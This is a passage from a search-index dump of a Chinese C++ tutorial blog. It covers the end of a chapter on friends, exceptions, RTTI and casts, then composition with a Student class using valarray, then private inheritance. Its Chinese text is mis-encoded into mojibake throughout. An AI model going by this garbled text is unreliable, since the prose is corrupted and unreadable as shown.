é¿å…ä½¿ç”¨ reinterpret_castï¼Œé™¤éç»å¯¹å¿…è¦ä¸”å®Œå…¨ç†è§£åæœã€‚ åœ¨å¤šæ€ç±»å‹å‘ä¸‹è½¬æ¢æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨ dynamic_cast ä»¥ç¡®ä¿å®‰å…¨ã€‚ 15.6 æ€»ç»“æœ¬ç« æ¢è®¨äº† C++ ä¸­ä¸€äº›é«˜çº§ç‰¹æ€§å’Œå¤„ç†ç‰¹æ®Šæƒ…å†µçš„æŠ€æœ¯ï¼ŒåŒ…æ‹¬å‹å…ƒã€åµŒå¥—ç±»ã€å¼‚å¸¸å¤„ç†å’Œè¿è¡Œæ—¶ç±»å‹è¯†åˆ«ï¼ˆRTTIï¼‰ä»¥åŠç±»å‹è½¬æ¢è¿ç®—ç¬¦ã€‚è¿™äº›å·¥å…·æä¾›äº†æ›´ç²¾ç»†çš„æ§åˆ¶å’Œæ›´å¼ºå¤§çš„é”™è¯¯å¤„ç†èƒ½åŠ›ã€‚ ä¸»è¦å†…å®¹å›é¡¾ï¼š å‹å…ƒ (Friends): å…è®¸ç‰¹å®šçš„å¤–éƒ¨å‡½æ•°ï¼ˆå‹å…ƒå‡½æ•°ï¼‰ã€ç±»ï¼ˆå‹å…ƒç±»ï¼‰æˆ–æˆå‘˜å‡½æ•°ï¼ˆå‹å…ƒæˆå‘˜å‡½æ•°ï¼‰è®¿é—®ä¸€ä¸ªç±»çš„ private å’Œ protected æˆå‘˜ã€‚ é€šè¿‡åœ¨å®¿ä¸»ç±»ä¸­ä½¿ç”¨ friend å…³é”®å­—å£°æ˜ã€‚ å‹å…ƒå…³ç³»ä¸æ˜¯ä¼ é€’çš„ï¼Œä¹Ÿä¸æ˜¯å¯¹ç§°çš„ã€‚ å‹å…ƒç ´åäº†å°è£…æ€§ï¼Œåº”è°¨æ…ä½¿ç”¨ï¼Œé€šå¸¸ç”¨äºé‡è½½è¿ç®—ç¬¦ï¼ˆå¦‚ &lt;&lt;ï¼‰æˆ–å®ç°ç´§å¯†åä½œçš„ç±»ã€‚ åµŒå¥—ç±» (Nested Classes): åœ¨ä¸€ä¸ªç±»ï¼ˆå¤–å›´ç±»ï¼‰å†…éƒ¨å®šä¹‰çš„ç±»ã€‚ ä½œç”¨åŸŸå±€é™äºå¤–å›´ç±»ï¼Œå¤–éƒ¨è®¿é—®éœ€ä½¿ç”¨ä½œç”¨åŸŸè§£æç¬¦ (Enclosing::Nested)ã€‚ åµŒå¥—ç±»å¯ä»¥è®¿é—®å¤–å›´ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ˆé€šè¿‡å¯¹è±¡ã€æŒ‡é’ˆæˆ–å¼•ç”¨ï¼‰ã€‚ å¤–å›´ç±»è®¿é—®åµŒå¥—ç±»æˆå‘˜å—åµŒå¥—ç±»è‡ªèº«è®¿é—®æ§åˆ¶é™åˆ¶ã€‚ å¸¸ç”¨äºå®ç°ä¸å¤–å›´ç±»ç›¸å…³çš„è¾…åŠ©ç±»æˆ–éšè—å®ç°ç»†èŠ‚ã€‚ å¼‚å¸¸å¤„ç† (Exceptions): ä¸€ç§ç»“æ„åŒ–çš„é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œç”¨äºå¤„ç†è¿è¡Œæ—¶å‘ç”Ÿçš„å¼‚å¸¸æƒ…å†µã€‚ ä½¿ç”¨ try å—åŒ…å›´å¯èƒ½æŠ›å‡ºå¼‚å¸¸çš„ä»£ç ï¼Œthrow è¯­å¥æŠ›å‡ºå¼‚å¸¸ï¼Œcatch å—æ•è·å¹¶å¤„ç†å¼‚å¸¸ã€‚ ç›¸æ¯”é”™è¯¯ç æˆ– abort()ï¼Œå¼‚å¸¸èƒ½æ›´å¥½åœ°åˆ†ç¦»é”™è¯¯æ£€æµ‹å’Œå¤„ç†ï¼Œè‡ªåŠ¨æ²¿è°ƒç”¨æ ˆä¼ æ’­ã€‚ æ¨èä½¿ç”¨ç±»å¯¹è±¡ï¼ˆæœ€å¥½ç»§æ‰¿è‡ª std::exceptionï¼‰ä½œä¸ºå¼‚å¸¸ç±»å‹ï¼Œå¯ä»¥æºå¸¦æ›´å¤šä¿¡æ¯å¹¶åˆ©ç”¨ç»§æ‰¿è¿›è¡Œåˆ†ç±»å¤„ç†ã€‚ æ ˆè§£é€€ (Stack Unwinding): å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œå±€éƒ¨å¯¹è±¡æŒ‰æ„é€ ç›¸åé¡ºåºé”€æ¯ï¼Œå…¶ææ„å‡½æ•°è¢«è°ƒç”¨ï¼Œæ˜¯ RAII å®ç°èµ„æºå®‰å…¨çš„å…³é”®ã€‚ noexcept (C++11): ç”¨äºå£°æ˜å‡½æ•°ä¿è¯ä¸æŠ›å‡ºå¼‚å¸¸ï¼Œæœ‰åŠ©äºä¼˜åŒ–å’Œå¼‚å¸¸å®‰å…¨ä¿è¯ã€‚ææ„å‡½æ•°åº”ä¸º noexceptã€‚ throw; ç”¨äºåœ¨ catch å—ä¸­é‡æ–°æŠ›å‡ºå½“å‰å¼‚å¸¸ã€‚ catch(...) ç”¨äºæ•è·ä»»ä½•ç±»å‹çš„å¼‚å¸¸ã€‚ å¼‚å¸¸å¤„ç†æœ‰æ€§èƒ½å¼€é”€ï¼Œé€‚ç”¨äºå¤„ç†å¼‚å¸¸è€Œéå¸¸è§„æµç¨‹ã€‚ RTTI (è¿è¡Œæ—¶ç±»å‹è¯†åˆ«): å…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å¯¹è±¡çš„å®é™…ç±»å‹ä¿¡æ¯ã€‚ ä¸»è¦ç”¨äºå…·æœ‰è™šå‡½æ•°çš„å¤šæ€ç±»å±‚æ¬¡ç»“æ„ã€‚ dynamic_cast&lt;&gt;: ç”¨äºå®‰å…¨çš„å‘ä¸‹è½¬æ¢ã€‚å¯¹æŒ‡é’ˆè½¬æ¢å¤±è´¥è¿”å› nullptrï¼›å¯¹å¼•ç”¨è½¬æ¢å¤±è´¥æŠ›å‡º std::bad_castã€‚ typeid(): è¿”å›å¯¹è±¡çš„ç±»å‹ä¿¡æ¯ (std::type_info å¯¹è±¡ï¼‰ï¼Œå¯ç”¨äºæ¯”è¾ƒç²¾ç¡®ç±»å‹ã€‚å¯¹ç©ºæŒ‡é’ˆæ“ä½œæŠ›å‡º std::bad_typeidã€‚ std::type_info: æä¾› name() æ–¹æ³•è·å–ç±»å‹åç§°ï¼ˆæ ¼å¼ä¾èµ–å®ç°ï¼‰å’Œæ¯”è¾ƒè¿ç®—ç¬¦ã€‚ åº”ä¼˜å…ˆä½¿ç”¨è™šå‡½æ•°å®ç°å¤šæ€ï¼ŒRTTI ä½œä¸ºè¡¥å……æˆ–ç‰¹å®šåœºæ™¯ä¸‹çš„è§£å†³æ–¹æ¡ˆã€‚ ç±»å‹è½¬æ¢è¿ç®—ç¬¦: C++ æä¾›äº†å››ä¸ªæ˜¾å¼ç±»å‹è½¬æ¢è¿ç®—ç¬¦ï¼Œæ¯” C é£æ ¼è½¬æ¢æ›´å®‰å…¨ã€æ„å›¾æ›´æ˜ç¡®ã€‚ static_cast&lt;&gt;: ç”¨äºç›¸å…³çš„ã€ç¼–è¯‘æ—¶å¯æ£€æŸ¥çš„è½¬æ¢ï¼ˆæ•°å€¼ã€å‘ä¸Šè½¬æ¢ã€ä¸å®‰å…¨çš„å‘ä¸‹è½¬æ¢ã€void*ï¼‰ã€‚ const_cast&lt;&gt;: å”¯ä¸€èƒ½ç§»é™¤æˆ–æ·»åŠ  const/volatile çš„è½¬æ¢ç¬¦ã€‚ä¿®æ”¹åŸå§‹ const å¯¹è±¡æ˜¯æœªå®šä¹‰è¡Œä¸ºã€‚ reinterpret_cast&lt;&gt;: ä½çº§åˆ«ä½æ¨¡å¼é‡æ–°è§£é‡Šï¼Œç”¨äºä¸ç›¸å…³æŒ‡é’ˆè½¬æ¢ã€æŒ‡é’ˆæ•´æ•°äº’è½¬ç­‰ã€‚éå¸¸å±é™©ï¼Œä¸å¯ç§»æ¤ã€‚ dynamic_cast&lt;&gt;: ç”¨äºå¤šæ€ç±»å‹å®‰å…¨çš„è¿è¡Œæ—¶å‘ä¸‹è½¬æ¢ã€‚ æœ¬ç« ä»‹ç»çš„ç‰¹æ€§ä¸ºå¤„ç†ç±»é—´å…³ç³»ã€é”™è¯¯æ¢å¤å’Œç±»å‹æŸ¥è¯¢æä¾›äº†æ›´å¤šå·¥å…·ï¼Œä½†ä¹Ÿå¸¦æ¥äº†å¤æ‚æ€§ã€‚ç†è§£å®ƒä»¬çš„åŸç†ã€é€‚ç”¨åœºæ™¯å’Œæ½œåœ¨é£é™©å¯¹äºç¼–å†™å¥å£®ã€é«˜æ•ˆçš„ C++ ç¨‹åºéå¸¸é‡è¦ã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 14 C++ä¸­çš„ä»£ç é‡ç”¨","slug":"Cpp_tutorial_Chapter_14","date":"2025-04-30T15:42:24.013Z","updated":"2025-04-30T15:40:20.039Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_14/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_14/","excerpt":"","text":"14.1 åŒ…å«å¯¹è±¡æˆå‘˜çš„ç±»é™¤äº†ç»§æ‰¿ (â€œis-aâ€ å…³ç³») ä¹‹å¤–ï¼ŒC++ æä¾›äº†å¦ä¸€ç§é‡è¦çš„ä»£ç é‡ç”¨æœºåˆ¶ï¼šåŒ…å« (Containment) æˆ– ç»„åˆ (Composition)**ã€‚è¿™ç§æ–¹å¼æ¨¡æ‹Ÿçš„æ˜¯ **â€has-aâ€ ï¼ˆæœ‰ä¸€ä¸ªï¼‰å…³ç³»ã€‚ å½“ä¸€ä¸ªç±»ï¼ˆç§°ä¸ºåŒ…å«ç±»æˆ–å®¹å™¨ç±»ï¼‰å°†å¦ä¸€ä¸ªç±»çš„å¯¹è±¡ä½œä¸ºå…¶æˆå‘˜å˜é‡æ—¶ï¼Œå°±ä½¿ç”¨äº†åŒ…å«æˆ–ç»„åˆã€‚ä¾‹å¦‚ï¼š ä¸€è¾† Car æœ‰ä¸€ä¸ª Engineã€‚ ä¸€ä¸ª Person æœ‰ä¸€ä¸ª Name (å¯èƒ½æ˜¯ string å¯¹è±¡)ã€‚ ä¸€ä¸ª Order æœ‰ä¸€ç»„ OrderItem å¯¹è±¡ã€‚ è¿™ç§æ–¹å¼å…è®¸æˆ‘ä»¬é€šè¿‡ç»„åˆå·²æœ‰çš„ã€åŠŸèƒ½å®Œå–„çš„ç±»æ¥æ„å»ºæ›´å¤æ‚çš„æ–°ç±»ã€‚ æœ¬èŠ‚æˆ‘ä»¬å°†è®¾è®¡ä¸€ä¸ª Student ç±»ï¼Œå®ƒå°†åŒ…å«ä¸€ä¸ª std::string å¯¹è±¡ï¼ˆè¡¨ç¤ºå­¦ç”Ÿå§“åï¼‰å’Œä¸€ä¸ª std::valarray&lt;double&gt; å¯¹è±¡ï¼ˆè¡¨ç¤ºå­¦ç”Ÿçš„è€ƒè¯•åˆ†æ•°ï¼‰ã€‚ 14.1.1 valarray ç±»ç®€ä»‹valarray æ˜¯ C++ æ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªæ¨¡æ¿ç±»ï¼ˆå®šä¹‰åœ¨ &lt;valarray&gt; å¤´æ–‡ä»¶ä¸­ï¼‰ï¼Œä¸“é—¨è®¾è®¡ç”¨äºç®€åŒ–å’Œä¼˜åŒ–æ•°å€¼æ•°ç»„çš„æ“ä½œã€‚å®ƒæä¾›äº†è®¸å¤šæ–¹ä¾¿çš„åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼š é€å…ƒç´ è¿ç®—: å¯ä»¥ç›´æ¥å¯¹æ•´ä¸ª valarray å¯¹è±¡æ‰§è¡Œç®—æœ¯è¿ç®—ï¼ˆå¦‚ +, -, *, /ï¼‰ï¼Œè¿ç®—ä¼šè‡ªåŠ¨åº”ç”¨äºæ¯ä¸ªå¯¹åº”çš„å…ƒç´ ã€‚ æ•°å­¦å‡½æ•°: å¯ä»¥å°†è®¸å¤šæ ‡å‡†æ•°å­¦å‡½æ•°ï¼ˆå¦‚ sqrt(), abs(), sin()ï¼‰åº”ç”¨äº valarray çš„æ‰€æœ‰å…ƒç´ ã€‚ åˆ‡ç‰‡å’Œç´¢å¼•: æä¾›çµæ´»çš„æ–¹å¼æ¥è®¿é—®å’Œæ“ä½œæ•°ç»„çš„å­é›†ã€‚ èšåˆæ“ä½œ: å†…ç½®äº†è®¡ç®—æ€»å’Œ (sum())ã€å¹³å‡å€¼ (sum()/size())ã€æœ€å¤§å€¼ (max())ã€æœ€å°å€¼ (min()) ç­‰æ–¹æ³•ã€‚ ç®€å•ç¤ºä¾‹: 123456789101112131415161718192021222324#include &lt;iostream&gt;#include &lt;valarray&gt; // åŒ…å« valarray å¤´æ–‡ä»¶#include &lt;vector&gt; // ç”¨äºåˆå§‹åŒ–ç¤ºä¾‹int main() &#123; std::vector&lt;double&gt; data = &#123;1.1, 2.2, 3.3, 4.4&#125;; std::valarray&lt;double&gt; v1(data.data(), data.size()); // ä» double æ•°ç»„åˆ›å»º valarray std::valarray&lt;double&gt; v2 = &#123;10.0, 10.0, 10.0, 10.0&#125;; // ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨ (C++11) std::valarray&lt;double&gt; v_sum(4); // åˆ›å»ºä¸€ä¸ªå¤§å°ä¸º 4 çš„ valarray v_sum = v1 + v2; // é€å…ƒç´ ç›¸åŠ : v_sum = &#123;11.1, 12.2, 13.3, 14.4&#125; std::cout &lt;&lt; &quot;Sum of elements in v1: &quot; &lt;&lt; v1.sum() &lt;&lt; std::endl; // è¾“å‡º 11 std::cout &lt;&lt; &quot;Size of v1: &quot; &lt;&lt; v1.size() &lt;&lt; std::endl; // è¾“å‡º 4 std::cout &lt;&lt; &quot;Element at index 1 in v_sum: &quot; &lt;&lt; v_sum[1] &lt;&lt; std::endl; // è¾“å‡º 12.2 v1 *= 2.0; // æ‰€æœ‰å…ƒç´ ä¹˜ä»¥ 2: v1 = &#123;2.2, 4.4, 6.6, 8.8&#125; for(double x : v1) &#123; // C++11 èŒƒå›´ for å¾ªç¯ std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; return 0;&#125; æˆ‘ä»¬å°†ä½¿ç”¨ valarray&lt;double&gt; æ¥å­˜å‚¨ Student çš„å¤šé—¨è¯¾æˆç»©ã€‚ 14.1.2 Student ç±»çš„è®¾è®¡æˆ‘ä»¬çš„ Student ç±»éœ€è¦å­˜å‚¨å§“åå’Œä¸€ç»„åˆ†æ•°ã€‚ å§“å: ä½¿ç”¨ std::string ç±»ã€‚ åˆ†æ•°: ä½¿ç”¨ std::valarray&lt;double&gt; ç±»ã€‚ æ¥å£è®¾è®¡: æˆ‘ä»¬éœ€è¦æä¾›æ–¹æ³•æ¥ï¼š æ„é€  Student å¯¹è±¡ï¼ˆæä¾›å§“åå’Œåˆ†æ•°ï¼‰ã€‚ è·å–å­¦ç”Ÿçš„å¹³å‡åˆ†ã€‚ è·å–å­¦ç”Ÿçš„å§“åã€‚ è·å–æŸä¸€é—¨è¯¾çš„åˆ†æ•°ã€‚ è¾“å‡ºå­¦ç”Ÿçš„ä¿¡æ¯ã€‚ studentc.h (Student ç±»æ¥å£) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#ifndef STUDENTC_H_#define STUDENTC_H_#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;valarray&gt; // åŒ…å« valarrayclass Student &#123;private: // ä½¿ç”¨åŒ…å«ï¼ˆç»„åˆï¼‰: Student &quot;has-a&quot; string and &quot;has-a&quot; valarray std::string name; // å§“å std::valarray&lt;double&gt; scores; // åˆ†æ•° (ä½¿ç”¨ valarray) // ç§æœ‰æ–¹æ³•ï¼Œç”¨äºè¾“å‡ºåˆ†æ•° std::ostream &amp; arr_out(std::ostream &amp; os) const;public: // æ„é€ å‡½æ•° Student() : name(&quot;Null Student&quot;), scores() &#123;&#125; // é»˜è®¤æ„é€ å‡½æ•° // ä½¿ç”¨ string å’Œ valarray åˆå§‹åŒ– Student(const std::string &amp; s, const std::valarray&lt;double&gt; &amp; a) : name(s), scores(a) &#123;&#125; // ä½¿ç”¨ string å’Œ C é£æ ¼æ•°ç»„åˆå§‹åŒ– Student(const std::string &amp; s, const double * pd, int n) : name(s), scores(pd, n) &#123;&#125; // valarray æ„é€ å‡½æ•°æ¥å— (æŒ‡é’ˆ, æ•°é‡) // ä½¿ç”¨ C é£æ ¼å­—ç¬¦ä¸²å’Œ C é£æ ¼æ•°ç»„åˆå§‹åŒ– Student(const char * str, const double * pd, int n) : name(str), scores(pd, n) &#123;&#125; // string å’Œ valarray æ„é€ å‡½æ•°å¤„ç†è½¬æ¢ ~Student() &#123;&#125; // ææ„å‡½æ•° (é»˜è®¤å³å¯ï¼Œå› ä¸º string å’Œ valarray ä¼šè‡ªå·±ç®¡ç†èµ„æº) // è®¿é—®å™¨ double Average() const; // è®¡ç®—å¹³å‡åˆ† const std::string &amp; Name() const; // è·å–å§“å (è¿”å› const å¼•ç”¨é¿å…å¤åˆ¶) double operator[](int i) const; // è·å–ç¬¬ i é—¨è¯¾åˆ†æ•° (const ç‰ˆæœ¬) double &amp; operator[](int i); // è·å–/è®¾ç½®ç¬¬ i é—¨è¯¾åˆ†æ•° (é const ç‰ˆæœ¬) // å‹å…ƒå‡½æ•° - ç”¨äºè¾“å…¥è¾“å‡º // input friend std::istream &amp; operator&gt;&gt;(std::istream &amp; is, Student &amp; stu); // è¯»å–å§“å friend std::istream &amp; getline(std::istream &amp; is, Student &amp; stu); // è¯»å–å§“å (æ•´è¡Œ) // output friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Student &amp; stu);&#125;;#endif // STUDENTC_H_ å…³é”®ç‚¹: æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨: Student çš„æ„é€ å‡½æ•°ä½¿ç”¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨æ¥åˆå§‹åŒ– name å’Œ scores æˆå‘˜ã€‚ name(s): è°ƒç”¨ std::string çš„æ„é€ å‡½æ•°ï¼ˆæˆ–å¤åˆ¶æ„é€ å‡½æ•°ï¼‰æ¥åˆå§‹åŒ– nameã€‚ scores(a) æˆ– scores(pd, n): è°ƒç”¨ std::valarray&lt;double&gt; çš„ç›¸åº”æ„é€ å‡½æ•°æ¥åˆå§‹åŒ– scoresã€‚ è‡ªåŠ¨èµ„æºç®¡ç†: å› ä¸º std::string å’Œ std::valarray éƒ½æ˜¯è®¾è®¡è‰¯å¥½çš„ç±»ï¼Œå®ƒä»¬ä¼šè‡ªåŠ¨ç®¡ç†è‡ªå·±çš„å†…å­˜ï¼ˆstring ç®¡ç†å­—ç¬¦æ•°æ®ï¼Œvalarray ç®¡ç† double æ•°æ®ï¼‰ã€‚å› æ­¤ï¼ŒStudent ç±»ä¸éœ€è¦æ˜¾å¼åœ°ç¼–å†™ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°æˆ–èµ‹å€¼è¿ç®—ç¬¦æ¥å¤„ç† name å’Œ scores çš„å†…å­˜ç®¡ç†ï¼ˆéµå¾ªé›¶æ³•åˆ™ï¼‰ã€‚ç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤ç‰ˆæœ¬ä¼šæ­£ç¡®åœ°è°ƒç”¨ string å’Œ valarray çš„ç›¸åº”ç‰¹æ®Šæˆå‘˜å‡½æ•°ã€‚ æ¥å£è½¬å‘: Student ç±»çš„ä¸€äº›æ–¹æ³•ï¼ˆå¦‚ operator[]ï¼‰å°†æ“ä½œè½¬å‘ç»™å…¶æˆå‘˜å¯¹è±¡ï¼ˆscores[i]ï¼‰ã€‚ 14.1.3 Student ç±»ç¤ºä¾‹studentc.cpp (Student ç±»å®ç°) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &quot;studentc.h&quot;using std::ostream;using std::endl;using std::istream;using std::string;// å…¬æœ‰æ–¹æ³•å®ç°double Student::Average() const &#123; if (scores.size() &gt; 0) return scores.sum() / scores.size(); // ä½¿ç”¨ valarray çš„ sum() å’Œ size() else return 0;&#125;const string &amp; Student::Name() const &#123; return name;&#125;// ä½¿ç”¨ [] è®¿é—®åˆ†æ•°double Student::operator[](int i) const &#123; return scores[i]; // è°ƒç”¨ valarray çš„ operator[]&#125;double &amp; Student::operator[](int i) &#123; return scores[i]; // è°ƒç”¨ valarray çš„ operator[]&#125;// ç§æœ‰æ–¹æ³•å®ç°// è¾“å‡ºåˆ†æ•°æ•°ç»„ostream &amp; Student::arr_out(ostream &amp; os) const &#123; int i; int lim = scores.size(); if (lim &gt; 0) &#123; for (i = 0; i &lt; lim; i++) &#123; os &lt;&lt; scores[i] &lt;&lt; &quot; &quot;; if (i % 5 == 4) // æ¯ 5 ä¸ªæ¢è¡Œ os &lt;&lt; endl; &#125; if (i % 5 != 0) os &lt;&lt; endl; &#125; else os &lt;&lt; &quot; empty array &quot;; return os;&#125;// å‹å…ƒå‡½æ•°å®ç°// ä½¿ç”¨ &gt;&gt; è¯»å–å§“åistream &amp; operator&gt;&gt;(istream &amp; is, Student &amp; stu) &#123; is &gt;&gt; stu.name; // è°ƒç”¨ string çš„ operator&gt;&gt; return is;&#125;// ä½¿ç”¨ getline è¯»å–å§“å (æ•´è¡Œ)istream &amp; getline(istream &amp; is, Student &amp; stu) &#123; getline(is, stu.name); // è°ƒç”¨ string çš„ getline return is;&#125;// ä½¿ç”¨ &lt;&lt; è¾“å‡ºå­¦ç”Ÿä¿¡æ¯ostream &amp; operator&lt;&lt;(ostream &amp; os, const Student &amp; stu) &#123; os &lt;&lt; &quot;Scores for &quot; &lt;&lt; stu.name &lt;&lt; &quot;:\\n&quot;; stu.arr_out(os); // ä½¿ç”¨ç§æœ‰æ–¹æ³•è¾“å‡ºåˆ†æ•° return os;&#125; use_stuc.cpp (ä½¿ç”¨ Student ç±») 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;iostream&gt;#include &quot;studentc.h&quot; // åŒ…å« Student ç±»å®šä¹‰using std::cin;using std::cout;using std::endl;void set(Student &amp; sa, int n); // å‡½æ•°åŸå‹const int pupils = 3;const int quizzes = 5;int main() &#123; Student ada[pupils] = &#123; // åˆ›å»º Student å¯¹è±¡æ•°ç»„ Student(quizzes), Student(quizzes), Student(quizzes) // å‡è®¾æœ‰ Student(int n) æ„é€ å‡½æ•° &#125;; // å‡è®¾ studentc.h/cpp å·²ä¿®æ”¹ï¼Œæ·»åŠ æ„é€ å‡½æ•° Student(int n) // Student::Student(int n) : name(&quot;Nully&quot;), scores(n) &#123;&#125; // ç¤ºä¾‹æ„é€ å‡½æ•° // å¦‚æœæ²¡æœ‰ Student(int n)ï¼Œåˆ™éœ€è¦è¿™æ ·åˆ›å»ºï¼š // double sample_scores[quizzes] = &#123;0.0&#125;; // ç¤ºä¾‹åˆ†æ•° // Student ada[pupils] = &#123; // Student(&quot;Default1&quot;, sample_scores, quizzes), // Student(&quot;Default2&quot;, sample_scores, quizzes), // Student(&quot;Default3&quot;, sample_scores, quizzes) // &#125;; // ä¸ºäº†ç¼–è¯‘é€šè¿‡ï¼Œæˆ‘ä»¬å‡è®¾ Student(int n) å­˜åœ¨ int i; for (i = 0; i &lt; pupils; ++i) set(ada[i], quizzes); // è®¾ç½®å­¦ç”Ÿæ•°æ® cout &lt;&lt; &quot;\\nStudent List:\\n&quot;; for (i = 0; i &lt; pupils; ++i) cout &lt;&lt; ada[i].Name() &lt;&lt; endl; // è¾“å‡ºå§“å cout &lt;&lt; &quot;\\nResults:&quot;; for (i = 0; i &lt; pupils; ++i) &#123; cout &lt;&lt; endl &lt;&lt; ada[i]; // è¾“å‡ºå®Œæ•´ä¿¡æ¯ (è°ƒç”¨ operator&lt;&lt;) cout &lt;&lt; &quot;average: &quot; &lt;&lt; ada[i].Average() &lt;&lt; endl; // è¾“å‡ºå¹³å‡åˆ† &#125; cout &lt;&lt; &quot;Done.\\n&quot;; return 0;&#125;// å‡½æ•°ï¼šè®¾ç½®å­¦ç”Ÿå§“åå’Œåˆ†æ•°void set(Student &amp; sa, int n) &#123; cout &lt;&lt; &quot;Please enter the student&#x27;s name: &quot;; getline(cin, sa); // ä½¿ç”¨å‹å…ƒ getline è¯»å–å§“å cout &lt;&lt; &quot;Please enter &quot; &lt;&lt; n &lt;&lt; &quot; quiz scores:\\n&quot;; for (int i = 0; i &lt; n; i++) cin &gt;&gt; sa[i]; // ä½¿ç”¨ operator[] è®¾ç½®åˆ†æ•° while (cin.get() != &#x27;\\n&#x27;) // æ¸…é™¤è¾“å…¥ç¼“å†²åŒº continue;&#125;// --- éœ€è¦ä¿®æ”¹ studentc.h/cpp æ·»åŠ  Student(int n) æ„é€ å‡½æ•° ---/*// studentc.h æ·»åŠ : explicit Student(int n) : name(&quot;Nully&quot;), scores(n) &#123;&#125; // explicit é˜²æ­¢æ„å¤–è½¬æ¢// studentc.cpp ä¸éœ€è¦é¢å¤–æ·»åŠ ï¼Œå› ä¸ºåˆå§‹åŒ–åˆ—è¡¨å·²å®Œæˆå·¥ä½œ*/ ç¼–è¯‘å’Œè¿è¡Œ: ä½ éœ€è¦å°† studentc.cpp å’Œ use_stuc.cpp ä¸€èµ·ç¼–è¯‘é“¾æ¥ã€‚ 123## å‡è®¾ studentc.h/cpp å·²æ·»åŠ  Student(int n) æ„é€ å‡½æ•°g++ use_stuc.cpp studentc.cpp -o use_stuc./use_stuc ç¨‹åºä¼šæç¤ºè¾“å…¥æ¯ä¸ªå­¦ç”Ÿçš„åå­—å’Œåˆ†æ•°ï¼Œç„¶åæ˜¾ç¤ºå­¦ç”Ÿåˆ—è¡¨å’Œæ¯ä¸ªå­¦ç”Ÿçš„è¯¦ç»†ä¿¡æ¯åŠå¹³å‡åˆ†ã€‚ æ€»ç»“: åŒ…å« (ç»„åˆ) æ˜¯é€šè¿‡å°†ä¸€ä¸ªç±»çš„å¯¹è±¡ä½œä¸ºå¦ä¸€ä¸ªç±»çš„æˆå‘˜æ¥å®ç°çš„ï¼Œæ¨¡æ‹Ÿ â€œhas-aâ€ å…³ç³»ã€‚ è¿™æ˜¯ä»£ç é‡ç”¨çš„é‡è¦æ–¹å¼ï¼Œå…è®¸åˆ©ç”¨ç°æœ‰ç±»çš„åŠŸèƒ½ã€‚ åŒ…å«ç±»çš„æ„é€ å‡½æ•°é€šå¸¸ä½¿ç”¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨æ¥è°ƒç”¨æˆå‘˜å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚ å¦‚æœæˆå‘˜å¯¹è±¡èƒ½æ­£ç¡®ç®¡ç†è‡ªå·±çš„èµ„æºï¼ˆå¦‚ std::string, std::valarray, æ™ºèƒ½æŒ‡é’ˆï¼‰ï¼ŒåŒ…å«ç±»é€šå¸¸ä¸éœ€è¦è‡ªå®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶/ç§»åŠ¨æ“ä½œï¼ˆé›¶æ³•åˆ™ï¼‰ã€‚ åŒ…å«ç±»å¯ä»¥é€šè¿‡å…¶æˆå‘˜å¯¹è±¡çš„å…¬æœ‰æ¥å£æ¥ä½¿ç”¨å®ƒä»¬çš„åŠŸèƒ½ã€‚ 14.2 ç§æœ‰ç»§æ‰¿é™¤äº†å…¬æœ‰ç»§æ‰¿ (public) æ¨¡æ‹Ÿ â€œis-aâ€ å…³ç³»å¤–ï¼ŒC++ è¿˜æä¾›äº†ç§æœ‰ç»§æ‰¿ (private)**ã€‚ç§æœ‰ç»§æ‰¿æ¨¡æ‹Ÿçš„æ˜¯ **â€has-aâ€ æˆ–æ›´å‡†ç¡®åœ°è¯´æ˜¯ â€œis-implemented-in-terms-ofâ€ ï¼ˆæ ¹æ®â€¦æ¥å®ç°ï¼‰çš„å…³ç³»ã€‚ è¯­æ³•: 123class DerivedClassName : private BaseClassName &#123; // ... æ´¾ç”Ÿç±»æˆå‘˜ ...&#125;; é»˜è®¤çš„ç»§æ‰¿æ–¹å¼ï¼ˆå¦‚æœçœç•¥è®¿é—®è¯´æ˜ç¬¦ï¼‰ä¹Ÿæ˜¯ private (å¯¹äº class)ã€‚ è®¿é—®è§„åˆ™: å½“ä¸€ä¸ªç±»ç§æœ‰ç»§æ‰¿è‡ªåŸºç±»æ—¶ï¼š åŸºç±»çš„ public æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸º **private**ã€‚ åŸºç±»çš„ protected æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸º **private**ã€‚ åŸºç±»çš„ private æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä»ç„¶æ˜¯ä¸å¯ç›´æ¥è®¿é—®çš„ã€‚ æ ¸å¿ƒæ€æƒ³: ç§æœ‰ç»§æ‰¿æ„å‘³ç€æ´¾ç”Ÿç±»ç»§æ‰¿äº†åŸºç±»çš„å®ç°ï¼Œä½†ä¸ç»§æ‰¿å…¶æ¥å£ã€‚åŸºç±»çš„å…¬æœ‰æ–¹æ³•ä¸ä¼šæˆä¸ºæ´¾ç”Ÿç±»å¯¹è±¡çš„å…¬æœ‰æ¥å£çš„ä¸€éƒ¨åˆ†ã€‚å¤–éƒ¨ä»£ç 